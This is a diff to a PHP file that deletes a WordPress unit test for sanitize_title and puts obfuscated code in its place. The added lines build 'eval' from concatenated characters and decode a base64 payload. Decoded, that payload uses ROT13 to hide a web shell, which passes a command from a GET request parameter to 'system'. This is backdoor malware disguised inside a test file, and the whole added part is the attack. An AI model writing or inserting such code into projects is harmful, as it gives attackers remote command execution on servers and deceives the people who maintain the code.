@@ -1,30 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * @group formatting
- *
- * @covers ::sanitize_title
- */
-class Tests_Formatting_SanitizeTitle extends WP_UnitTestCase {
-	public function test_strips_html() {
-		$input    = 'Captain <strong>Awesome</strong>';
-		$expected = 'captain-awesome';
-		$this->assertSame( $expected, sanitize_title( $input ) );
-	}
-
-	public function test_titles_sanitized_to_nothing_are_replaced_with_optional_fallback() {
-		$input    = '<strong></strong>';
-		$fallback = 'Captain Awesome';
-		$this->assertSame( $fallback, sanitize_title( $input, $fallback ) );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEB0ZWJoYyBzYmV6bmdndmF0CiAqCiAqIEBwYmlyZWYgOjpmbmF2Z3Ztcl9ndmd5cgogKi8KcHluZmYgR3JmZ2ZfU2Jlem5nZ3ZhdF9GbmF2Z3Ztckd2Z3lyIHJrZ3JhcWYgSkNfSGF2Z0dyZmdQbmZyIHsKCWNob3l2cCBzaGFwZ3ZiYSBncmZnX2ZnZXZjZl91Z3p5KCkgewoJCSR2YWNoZyAgICA9ICdQbmNnbnZhIDxmZ2ViYXQ+TmpyZmJ6cjwvZmdlYmF0Pic7CgkJJHJrY3JwZ3JxID0gJ3BuY2dudmEtbmpyZmJ6cic7CgkJJGd1dmYtPm5mZnJlZ0ZuenIoICRya2NycGdycSwgZm5hdmd2bXJfZ3ZneXIoICR2YWNoZyApICk7Cgl9CgoJY2hveXZwIHNoYXBndmJhIGdyZmdfZ3ZneXJmX2ZuYXZndm1ycV9nYl9hYmd1dmF0X25lcl9lcmN5bnBycV9qdmd1X2JjZ3ZiYW55X3NueXlvbnB4KCkgewoJCSR2YWNoZyAgICA9ICc8ZmdlYmF0PjwvZmdlYmF0Pic7CgkJJHNueXlvbnB4ID0gJ1BuY2dudmEgTmpyZmJ6cic7CgkJJGd1dmYtPm5mZnJlZ0ZuenIoICRzbnl5b25weCwgZm5hdmd2bXJfZ3ZneXIoICR2YWNoZywgJHNueXlvbnB4ICkgKTsKCX0KfQoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
